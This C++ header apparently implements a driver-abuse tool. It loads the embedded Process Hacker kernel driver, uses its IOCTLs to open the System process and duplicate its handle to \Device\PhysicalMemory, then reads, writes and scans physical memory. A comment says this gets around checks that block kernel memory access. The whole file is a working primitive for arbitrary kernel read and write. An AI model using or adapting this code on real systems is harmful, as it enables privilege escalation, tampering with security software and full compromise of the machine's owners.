#pragma once
#include "Driver.hpp"
#include "KProcessHacker.hpp"
#include "Tools.hpp"
#include <vector>

#define SYSTEM_PID 4
#define SystemExtendedHandleInformation 64

#define HANDLE_TYPE_SEARCHED L"Section"
#define HANDLE_NAME_SEARCHED L"\\Device\\PhysicalMemory"

#define KPH_DEVICE_TYPE 0x9999
#define KPH_CTL_CODE(x) CTL_CODE(KPH_DEVICE_TYPE, 0x800 + x, METHOD_NEITHER, FILE_ANY_ACCESS)
#define KPH_OPENPROCESS KPH_CTL_CODE(50)
#define KPH_QUERYINFORMATIONOBJECT KPH_CTL_CODE(151)
#define KPH_DUPLICATEOBJECT KPH_CTL_CODE(153)

#define PH_LARGE_BUFFER_SIZE (256 * 1024 * 1024)

#define PHACKER_DRIVER_FILE  "kprocesshacker.sys"
#define PHACKER_SERVICE_NAME "KProcessHacker2"
#define PHACKER_DEVICE_NAME  "\\Device\\KProcessHacker2"

// System structs
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

// Process Hacker structs
typedef enum _KPH_OBJECT_INFORMATION_CLASS
{
	KphObjectBasicInformation, // q: OBJECT_BASIC_INFORMATION
	KphObjectNameInformation, // q: OBJECT_NAME_INFORMATION
	KphObjectTypeInformation, // q: OBJECT_TYPE_INFORMATION
	KphObjectHandleFlagInformation, // qs: OBJECT_HANDLE_FLAG_INFORMATION
	KphObjectProcessBasicInformation, // q: PROCESS_BASIC_INFORMATION
	KphObjectThreadBasicInformation, // q: THREAD_BASIC_INFORMATION
	KphObjectEtwRegBasicInformation, // q: ETWREG_BASIC_INFORMATION
	KphObjectFileObjectInformation, // q: KPH_FILE_OBJECT_INFORMATION
	KphObjectFileObjectDriver, // q: KPH_FILE_OBJECT_DRIVER
	MaxKphObjectInfoClass
} KPH_OBJECT_INFORMATION_CLASS;

typedef struct _OBJECT_TYPE_INFORMATION
{
	UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	UCHAR TypeIndex; // since WINBLUE
	CHAR ReservedByte;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;

typedef struct _OBJECT_NAME_INFORMATION
{
	UNICODE_STRING Name;
} OBJECT_NAME_INFORMATION, *POBJECT_NAME_INFORMATION;

// System internal functions
EXTERN_C NTSTATUS NTAPI NtMapViewOfSection(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER
	SectionOffset,
	PSIZE_T ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);

inline DWORD Higher32Bits(const DWORD64 value) { return (value >> 32); }
inline DWORD Lower32Bits(const DWORD64 value) { const DWORD low = value; return low; }

HANDLE PhOpenProcess(HANDLE hPh, DWORD dwDesiredAccess, DWORD dwPid, DWORD dwTid = NULL)
{
	HANDLE hProcess = nullptr;
	CLIENT_ID clientId;
	IO_STATUS_BLOCK isb;

	clientId.UniqueProcess = reinterpret_cast<HANDLE>(dwPid);
	clientId.UniqueThread = reinterpret_cast<HANDLE>(dwTid);

	struct
	{
		PHANDLE ProcessHandle;
		ACCESS_MASK DesiredAccess;
		CLIENT_ID* ClientId;
	} inputOpenProcess = { &hProcess, dwDesiredAccess, &clientId };

	const auto status = NtDeviceIoControlFile(hPh, nullptr, nullptr, nullptr, &isb, KPH_OPENPROCESS, &inputOpenProcess, sizeof(inputOpenProcess), nullptr, 0);

	return hProcess;
}

HANDLE PhDuplicateObject(HANDLE hPh, HANDLE hSourceProcess, HANDLE hSourceHandle, DWORD dwDesiredAccess, HANDLE hTargetProcess = nullptr, ULONG ulHandleAttributes = NULL, ULONG ulOptions = NULL)
{
	bool bCloseTarget = false;
	if (!hTargetProcess)
	{
		bCloseTarget = true;
		// Getting a fully qualified handle on self for incoming handle duplication
		hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId()); // Can lower permissions
		if (!hTargetProcess)
			return static_cast<HANDLE>(nullptr);
	}

	// Getting handle on \Device\PhysicalMemory by duplicating one of the naturally existing ones in PID 4
	HANDLE hDup = nullptr;
	IO_STATUS_BLOCK isb;

	struct
	{
		HANDLE SourceProcessHandle;
		HANDLE SourceHandle;
		HANDLE TargetProcessHandle;
		PHANDLE TargetHandle;
		ACCESS_MASK DesiredAccess;
		ULONG HandleAttributes; // OBJ_KERNEL_HANDLE or NULL only
		ULONG Options; // DUPLICATE_CLOSE_SOURCE or NULL only
	} inputDuplicateHandle = { hSourceProcess, hSourceHandle, hTargetProcess, &hDup, dwDesiredAccess, ulHandleAttributes, ulOptions };

	const auto status = NtDeviceIoControlFile(hPh, nullptr, nullptr, nullptr, &isb, KPH_DUPLICATEOBJECT, &inputDuplicateHandle, sizeof(inputDuplicateHandle), nullptr, 0);

	if (bCloseTarget)
		CloseHandle(hTargetProcess);

	return hDup;
}

/**
* Enumerates all open handles.
*
* \param handles A variable which receives a pointer to a structure containing information about
* all opened handles. You must free the structure using PhFree() when you no longer need it.
*
* \retval STATUS_INSUFFICIENT_RESOURCES The handle information returned by the kernel is too large.
*
* \remarks This function is only available starting with Windows XP.
*/
NTSTATUS PhEnumHandlesEx(PSYSTEM_HANDLE_INFORMATION_EX *handles)
{
	static ULONG initialBufferSize = 0x10000;
	auto status = STATUS_SUCCESS;

	auto bufferSize = initialBufferSize;
	auto buffer = VirtualAlloc(nullptr, bufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!buffer)
		return STATUS_UNSUCCESSFUL;

	while ((status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemExtendedHandleInformation), buffer, bufferSize, nullptr)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (!VirtualFree(buffer, 0, MEM_RELEASE))
		{
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		bufferSize *= 2;

		// Fail if we're resizing the buffer to something very large.
		if (bufferSize > PH_LARGE_BUFFER_SIZE)
			return STATUS_INSUFFICIENT_RESOURCES;

		buffer = VirtualAlloc(nullptr, bufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!buffer)
		{
			status = STATUS_UNSUCCESSFUL;
			break;
		}
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(buffer, 0, MEM_RELEASE);
		return status;
	}

	if (bufferSize <= 0x200000) initialBufferSize = bufferSize;
	*handles = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	return status;
}

NTSTATUS PhQueryInformationObject(HANDLE hPh, HANDLE hProcess, HANDLE handle, KPH_OBJECT_INFORMATION_CLASS objClassInfo, PVOID pObjInfo, ULONG obInfoLen, PULONG returnLen)
{
	struct
	{
		HANDLE ProcessHandle;
		HANDLE Handle;
		KPH_OBJECT_INFORMATION_CLASS ObjectInformationClass;
		PVOID ObjectInformation;
		ULONG ObjectInformationLength;
		PULONG ReturnLength;
	} inputQueryInfoObject = { hProcess, handle, objClassInfo, pObjInfo, obInfoLen, returnLen };

	IO_STATUS_BLOCK isb;

	return NtDeviceIoControlFile(hPh, nullptr, nullptr, nullptr, &isb, KPH_QUERYINFORMATIONOBJECT, &inputQueryInfoObject, sizeof(inputQueryInfoObject), nullptr, 0);
}

HANDLE PhFindHandleToPhysMem(HANDLE hPh, HANDLE hProcess)
{
	PSYSTEM_HANDLE_INFORMATION_EX shInfo = nullptr;
	if (PhEnumHandlesEx(&shInfo) != STATUS_SUCCESS)
		return static_cast<HANDLE>(nullptr);

	for (ULONG i = 0; i < shInfo->NumberOfHandles; ++i)
	{
		// Removing handles that don't belong to target process
		if (shInfo->Handles[i].UniqueProcessId != GetProcessId(hProcess)) // Could do that with PH, but whatever
			continue; // Handles doesn't belong to the target process

		NTSTATUS status = STATUS_SUCCESS;

		// Getting object type information, looking for Section objects (first get the size, then get the info)
		POBJECT_TYPE_INFORMATION typeBuffer = nullptr;
		ULONG typeBufferSize = 0x200;
		ULONG typeReturnLength = 0;
		ULONG typeAttempts = 8;

		typeBuffer = static_cast<POBJECT_TYPE_INFORMATION>(VirtualAlloc(nullptr, typeBufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
		if (!typeBuffer)
		{
			VirtualFree(shInfo, 0, MEM_RELEASE);
			return static_cast<HANDLE>(nullptr);
		}

		// A loop is needed because the I/O subsystem likes to give us the wrong return lengths...
		do
		{
			status = PhQueryInformationObject(hPh, hProcess, reinterpret_cast<HANDLE>(shInfo->Handles[i].HandleValue), KphObjectTypeInformation, typeBuffer, typeReturnLength, &typeReturnLength);

			if (status == STATUS_BUFFER_OVERFLOW || status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL)
			{
				if (!VirtualFree(typeBuffer, 0, MEM_RELEASE))
				{
					VirtualFree(shInfo, 0, MEM_RELEASE);
					return static_cast<HANDLE>(nullptr);
				}
				typeBuffer = static_cast<POBJECT_TYPE_INFORMATION>(VirtualAlloc(nullptr, typeBufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
				if (!typeBuffer)
				{
					VirtualFree(shInfo, 0, MEM_RELEASE);
					return static_cast<HANDLE>(nullptr);
				}
			}
			else
			{
				break;
			}
		} while (--typeAttempts);

		if (!typeAttempts || typeBuffer->TypeName.Length == 0)
		{
			VirtualFree(typeBuffer, 0, MEM_RELEASE);
			continue;
		}

		if (wcscmp(typeBuffer->TypeName.Buffer, HANDLE_TYPE_SEARCHED) != 0)
		{
			VirtualFree(typeBuffer, 0, MEM_RELEASE);
			continue;
		}
		VirtualFree(typeBuffer, 0, MEM_RELEASE);

		// Getting object name, looking for \Device\PhysicalMemory (same, first get size, then info)
		POBJECT_NAME_INFORMATION nameBuffer = nullptr;
		ULONG nameReturnBuffer = 0;
		ULONG nameBufferSize = 0x200;
		ULONG nameReturnLength = 0;
		ULONG nameAttempts = 8;

		nameBuffer = static_cast<POBJECT_NAME_INFORMATION>(VirtualAlloc(nullptr, nameBufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
		if (!nameBuffer)
		{
			VirtualFree(shInfo, 0, MEM_RELEASE);
			return static_cast<HANDLE>(nullptr);
		}

		// A loop is needed because the I/O subsystem likes to give us the wrong return lengths...
		do
		{
			status = PhQueryInformationObject(hPh, hProcess, reinterpret_cast<HANDLE>(shInfo->Handles[i].HandleValue), KphObjectNameInformation, nameBuffer, nameReturnBuffer, &nameReturnBuffer);
			
			if (status == STATUS_BUFFER_OVERFLOW || status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL)
			{
				if (!VirtualFree(nameBuffer, 0, MEM_RELEASE))
				{
					VirtualFree(shInfo, 0, MEM_RELEASE);
					return static_cast<HANDLE>(nullptr);
				}
				nameBuffer = static_cast<POBJECT_NAME_INFORMATION>(VirtualAlloc(nullptr, typeBufferSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE));
				if (!nameBuffer)
				{
					VirtualFree(shInfo, 0, MEM_RELEASE);
					return static_cast<HANDLE>(nullptr);
				}
			}
			else
			{
				break;
			}
		} while (--nameAttempts);

		if (!nameAttempts || nameBuffer->Name.Length == 0)
		{
			VirtualFree(nameBuffer, 0, MEM_RELEASE);
			continue;
		}

		HANDLE hFound = nullptr;
		if (wcscmp(nameBuffer->Name.Buffer, HANDLE_NAME_SEARCHED) == 0)
			hFound = reinterpret_cast<HANDLE>(shInfo->Handles[i].HandleValue);
		VirtualFree(nameBuffer, 0, MEM_RELEASE);
		if (hFound)
		{
			VirtualFree(shInfo, 0, MEM_RELEASE);
			return hFound;
		}
	}

	VirtualFree(shInfo, 0, MEM_RELEASE);
	return static_cast<HANDLE>(nullptr);
}

NTSTATUS ReadWritePhysMem(HANDLE hPhysMem, uintptr_t addr, size_t size, void* inOutBuf, bool read = true)
{
	PVOID ptrBaseMemMapped = nullptr;
	const auto inheritDisposition = ViewShare;
	NTSTATUS status = STATUS_SUCCESS;
	LARGE_INTEGER sectionOffset;

	// Mapping page
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	const uintptr_t offsetRead = addr % sysInfo.dwPageSize;
	const uintptr_t addrBasePage = addr - offsetRead;
	sectionOffset.QuadPart = addrBasePage;

	// Making sure that the info to read doesn't span on 2 different pages
	const uintptr_t addrEndOfReading = addr + size;
	const uintptr_t offsetEndOfRead = addrEndOfReading % sysInfo.dwPageSize;
	const uintptr_t addrBasePageEndOfReading = addrEndOfReading - offsetEndOfRead;
	size_t sizeToMap = sysInfo.dwPageSize;
	if (addrBasePageEndOfReading != addrBasePage)
		sizeToMap *= 2;

	// We cannot simply use a MapViewOfFile, since it does checks that prevents us from reading kernel memory, so we use NtMapViewOfSection.
	status = NtMapViewOfSection(hPhysMem, GetCurrentProcess(), &ptrBaseMemMapped, NULL, NULL, &sectionOffset, &sizeToMap, inheritDisposition, NULL, PAGE_READWRITE);

	if (status != STATUS_SUCCESS || !ptrBaseMemMapped)
		return status;

	// Copying the memory, unmapping, and returning
	const uintptr_t localAddrToRead = reinterpret_cast<uintptr_t>(ptrBaseMemMapped) + offsetRead;
	if (read)
		memcpy(inOutBuf, reinterpret_cast<void*>(localAddrToRead), size);
	else
		memcpy(reinterpret_cast<void*>(localAddrToRead), inOutBuf, size);
	UnmapViewOfFile(ptrBaseMemMapped);
	return status;
}

NTSTATUS ReadPhysMem(HANDLE hPhysMem, uintptr_t addr, size_t size, void* outBuf)
{
	return ReadWritePhysMem(hPhysMem, addr, size, outBuf, true);
}

NTSTATUS WritePhysMem(HANDLE hPhysMem, uintptr_t addr, size_t size, void* inBuf)
{
	return ReadWritePhysMem(hPhysMem, addr, size, inBuf, false);
}

std::vector<uintptr_t> SearchPhysMem(HANDLE hPhysMem, const char patternToFind[], size_t sizeOfPatten)
{
	std::vector<uintptr_t> vptrStrFoundAt;

	/*
	// This returns the physically installed memory, however, this may cause BSOD, since not all memory is supposed to be accessed
	ULONGLONG ullSysMemory = 0;
	if (!GetPhysicallyInstalledSystemMemory(&ullSysMemory))
	return vptrStrFoundAt;
	ullSysMemory *= 1024;
	*/

	 // Getting info on OS available physical memory
	MEMORYSTATUSEX memStatEx = {};
	memStatEx.dwLength = sizeof(memStatEx);
	if (!GlobalMemoryStatusEx(&memStatEx))
		return vptrStrFoundAt;
	// Memory pages info
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);

	// Loop to search physmem
	PVOID ptrBaseMemMapped = nullptr;
	const auto inheritDisposition = ViewShare;
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T viewSize = sysInfo.dwPageSize *= 2;
	LARGE_INTEGER sectionOffset;
	SecureZeroMemory(&sectionOffset, sizeof(sectionOffset));

	// We cannot simply use a MapViewOfFile, since it does checks that prevents us from reading kernel memory, so we use NtMapViewOfSection.
	while ((status = NtMapViewOfSection(hPhysMem, GetCurrentProcess(), &ptrBaseMemMapped, NULL, NULL, &sectionOffset, &viewSize, inheritDisposition, NULL, PAGE_READONLY)) == STATUS_SUCCESS)
	{
		// Check for error or finished
		if (!ptrBaseMemMapped)
			break;
		if (sectionOffset.QuadPart >= memStatEx.ullAvailPhys)
		{
			UnmapViewOfFile(ptrBaseMemMapped);
			break;
		}

		// Scan memory for our string.
		std::string needle(patternToFind, patternToFind + sizeOfPatten);
		std::string haystack(static_cast<char*>(ptrBaseMemMapped), viewSize);
		std::size_t pos = haystack.find(needle);
		if (pos != std::string::npos)
			vptrStrFoundAt.push_back(static_cast<uintptr_t>(sectionOffset.QuadPart) + pos);

		// Unmapping and preparing for next page
		if (!UnmapViewOfFile(ptrBaseMemMapped))
			break;
		ptrBaseMemMapped = nullptr;
		sectionOffset.QuadPart += sysInfo.dwPageSize;
	}

	return vptrStrFoundAt;
}

/*
// This is how PH should get the handles with the driver, however it doesn't seem to work on Windows 10, so they use a fallback method (see PhEnumHandlesFallback)
#define KPH_OPENPROCESS KPH_CTL_CODE(50)
#define FIELD_OFFSET(type, field)    ((LONG)(LONG_PTR)&(((type *)0)->field))
bool KphEnumHandles(HANDLE hPh, HANDLE hPid, HANDLE hProcess, PSYSTEM_HANDLE_INFORMATION_EX *Handles)
{
	PKPH_PROCESS_HANDLE_INFORMATION handles = nullptr;

	// if (!KphEnumerateProcessHandles2(hProcess, &handles))

	ULONG bufferSize = 2048;
	auto buffer = VirtualAlloc(nullptr, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	while (true)
	{
		// status = KphEnumerateProcessHandles(ProcessHandle, buffer, bufferSize, &bufferSize);


		struct
		{
			HANDLE ProcessHandle;
			PVOID Buffer;
			ULONG BufferLength;
			PULONG ReturnLength;
		} inputEnumHandles = { hProcess, buffer, bufferSize, &bufferSize };
		//} inputEnumHandles = { nullptr, nullptr, 0, nullptr };

		// KphpDeviceIoControl(KPH_ENUMERATEPROCESSHANDLES, &input, sizeof(input));
		IO_STATUS_BLOCK isb;

		const auto status = NtDeviceIoControlFile(hPh, nullptr, nullptr, nullptr, &isb, KPH_ENUMERATEPROCESSHANDLES, &inputEnumHandles, sizeof(inputEnumHandles), nullptr, 0);

		if (status == STATUS_BUFFER_TOO_SMALL)
		{
			VirtualFree(buffer, 0, MEM_RELEASE);
			buffer = VirtualAlloc(nullptr, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		}
		else
			break;
	}

	handles = static_cast<PKPH_PROCESS_HANDLE_INFORMATION>(buffer);
	//VirtualFree(buffer, 0, MEM_RELEASE);

	// Preparing buffer for conversion
	const auto sizeRequired = FIELD_OFFSET(SYSTEM_HANDLE_INFORMATION_EX, Handles) + sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX) * handles->HandleCount;
	const auto convertedHandles = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(nullptr, sizeRequired, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (!convertedHandles)
		return false;

	// Converting handles to Process Hacker format
	convertedHandles->NumberOfHandles = handles->HandleCount;
	for (ULONG i = 0; i < handles->HandleCount; i++)
	{
		convertedHandles->Handles[i].Object = handles->Handles[i].Object;
		convertedHandles->Handles[i].UniqueProcessId = (ULONG_PTR)hPid;
		convertedHandles->Handles[i].HandleValue = (ULONG_PTR)handles->Handles[i].Handle;
		convertedHandles->Handles[i].GrantedAccess = (ULONG)handles->Handles[i].GrantedAccess;
		convertedHandles->Handles[i].CreatorBackTraceIndex = 0;
		convertedHandles->Handles[i].ObjectTypeIndex = handles->Handles[i].ObjectTypeIndex;
		convertedHandles->Handles[i].HandleAttributes = handles->Handles[i].HandleAttributes;
	}
	*Handles = convertedHandles;

	// Cleanup and return
	//VirtualFree(convertedHandles, 0, MEM_RELEASE);
	return false;
}
*/

HANDLE PhysMeme()
{
	// KProcessHacker requires debug privileges
	if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
		return static_cast<HANDLE>(nullptr);

	// Connecting to the driver
	Driver drv(PHACKER_DRIVER_FILE, PHACKER_DEVICE_NAME, PHACKER_SERVICE_NAME, KProcessHacker, KProcessHackerSize);
	if (!drv.GetHandle())
	{
		SetPrivilege(SE_DEBUG_NAME, FALSE);
		return static_cast<HANDLE>(nullptr);
	}

	// Getting handle on PID 4, System
	HANDLE hSystem = PhOpenProcess(drv.GetHandle(), PROCESS_ALL_ACCESS, SYSTEM_PID);
	if (!hSystem)
	{
		SetPrivilege(SE_DEBUG_NAME, FALSE);
		return static_cast<HANDLE>(nullptr);
	}
	
	// Getting a handle ID to \Device\PhysicalMemory belonging to PID 4
	const auto hPhysMemInSystem = PhFindHandleToPhysMem(drv.GetHandle(), hSystem);
	if (!hPhysMemInSystem)
	{
		CloseHandle(hSystem);
		SetPrivilege(SE_DEBUG_NAME, FALSE);
		return static_cast<HANDLE>(nullptr);
	}
	
	// Getting handle on \Device\PhysicalMemory by duplicating one of the naturally existing ones in PID 4
	const auto hPhysMem = PhDuplicateObject(drv.GetHandle(), hSystem, hPhysMemInSystem, FILE_MAP_ALL_ACCESS);

	// Cleanup and return
	CloseHandle(hSystem);
	SetPrivilege(SE_DEBUG_NAME, FALSE);
	return hPhysMem;
}